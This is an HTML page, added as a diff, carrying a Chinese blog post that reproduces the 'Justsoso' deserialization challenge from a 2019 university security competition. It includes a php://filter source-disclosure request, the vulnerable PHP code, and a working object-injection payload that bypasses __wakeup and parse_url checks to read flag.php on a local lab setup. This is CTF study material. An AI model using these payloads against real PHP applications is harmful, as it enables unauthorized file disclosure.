@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            2019全国大学生信息安全竞赛反序列化题目复现
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Justsoso"><span class="toc-text">Web - Justsoso</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%8F%82%E8%80%83"><span class="toc-text">题目参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="Web-Justsoso"><a href="#Web-Justsoso" class="headerlink" title="Web - Justsoso"></a>Web - Justsoso</h2><p>使用php伪协议读到hint和index的源码：</p>
+<p><code>/index.php?file=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
+<ul>
+<li>index.php:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>], <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<ul>
+<li>hint.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking upn&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>分析index.php (参数file, payload都被定义)</li>
+</ul>
+<ol>
+<li>file参数中读到<code>flag</code>就拦截</li>
+<li>使用parse_url解析当前URL的路径</li>
+<li>继续匹配<code>flag</code>并拦截</li>
+<li>全部通过了之后反序列化payload参数的值</li>
+</ol>
+<ul>
+<li>分析hint.php</li>
+</ul>
+<p>class Handle：</p>
+<ol>
+<li><code>__wakeup()</code> 将所有变量都赋值为空</li>
+<li><code>__construct($handle)</code> 将$handle的值赋值给$this-&gt;handle</li>
+<li><code>__destruct()</code> 调用getFlag();</li>
+</ol>
+<p>class Flag：</p>
+<ol>
+<li><code>__construct($file)</code> 将$file赋值给$this-&gt;file，token_flag，token都赋值为1-10000同一个随机数字的md5值。</li>
+<li><code>getFlag()</code> token_flah被赋值为一个新的随机数md5值，判断token和token_flag是否一致，如果一致，再判断$this-&gt;file是否被定义，如果定义，再读取文件。即可以读取flag。</li>
+</ol>
+<ul>
+<li>目的：</li>
+</ul>
+<p>通过反序列化构造一个poc，定义$file，读取到flag。</p>
+<p>这里有几处需要注意的地方：</p>
+<ol>
+<li>需要绕过parse_url使<code>flag</code>字符能够被传递进来。</li>
+<li><code>__wakeup()</code>清空了所有变量，需要绕过。</li>
+<li>如何使token和token_flag的值在getFlag()处相等</li>
+</ol>
+<ul>
+<li>构造反序列化：</li>
+</ul>
+<p>这里我直接复制了参考文章里面的构造源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;         </span><br><span class="line">            &#125;          </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Waking upn&quot;</span>;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;           </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>;       </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;         </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;    </span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;       </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;      </span><br><span class="line">            <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>);               </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Flag(<span class="string">&quot;flag.php&quot;</span>);  <span class="comment">//先创建Flag对象</span></span><br><span class="line"><span class="variable">$b</span>-&gt;token=&amp;<span class="variable">$b</span>-&gt;token_flag;	<span class="comment">//将token作为token_flag的引用</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Handle(<span class="variable">$b</span>);	<span class="comment">//创建Handle对象,将Flag对象作为参数传递进去，进而可以调用getFlag()方法。</span></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$a</span>)); <span class="comment">//最后序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据文中的方法，三个需要注意的点的绕过方法为：</p>
+<ol>
+<li>利用parse_url解析漏洞，在域名后面的一个/改为///即可绕过</li>
+<li>当成员属性数目大于实际数目时可绕过wakeup方法，也就是将poc里的：<code>O:6:&quot;Handle&quot;:1:&#123;s:...</code> 改为 <code>O:6:&quot;Handle&quot;:2:&#123;s:...</code> 即可。</li>
+<li>使用php的引用赋值，将token作为token_flag的引用，当token_flag重新被赋值时，token也会改变。</li>
+</ol>
+<p>最后的poc为：</p>
+<p><code>http://127.0.0.1///index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:&#123;s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:&#123;s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;&#125;&#125;</code></p>
+<p>由于题目环境已经不在了，本地搭建了一下,parse_url解析漏洞复现不出来，于是只能跳过那个复现一下，如图。</p>
+<p><img src="https://i.loli.net/2019/04/27/5cc4058f84a22.jpg" alt="pic"></p>
+<h2 id="题目参考"><a href="#题目参考" class="headerlink" title="题目参考"></a>题目参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177039">https://www.anquanke.com/post/id/177039</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.cnblogs.com/kagari/p/10758155.html">http://www.cnblogs.com/kagari/p/10758155.html</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
